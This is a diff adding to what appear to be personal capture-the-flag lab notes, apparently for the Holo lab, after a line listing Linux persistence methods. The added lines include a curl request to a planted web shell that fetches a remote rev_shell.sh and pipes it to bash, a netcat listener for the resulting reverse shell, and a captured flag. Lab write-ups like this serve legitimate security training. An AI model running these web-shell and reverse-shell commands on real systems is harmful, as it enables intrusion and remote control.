@@ -27,3 +27,21 @@ So what to do after we gained a decent foothold and have a stable shell. Like we
 SO different methods for persistence: LD_PRELOAD Backdoored binaries PAM backdoor SSH keys Malicious Services Cronjob Credential harvesting
 
 
+```
+curl 192.168.100.1:8080/shell.php?cmd=curl%20http%3A%2F%2F10.50.104.169%3A8080%2Frev_shell.sh%7Cbash%20%26
+```
+![[Pasted image 20240219212157.png]]
+
+
+![[Pasted image 20240219212210.png]]
+
+
+```
+nc -lvnp 4242
+```
+![[Pasted image 20240219212229.png]]
+
+
+```
+HOLO{3792d7d80c4dcabb8a533afddf06f666}
+```
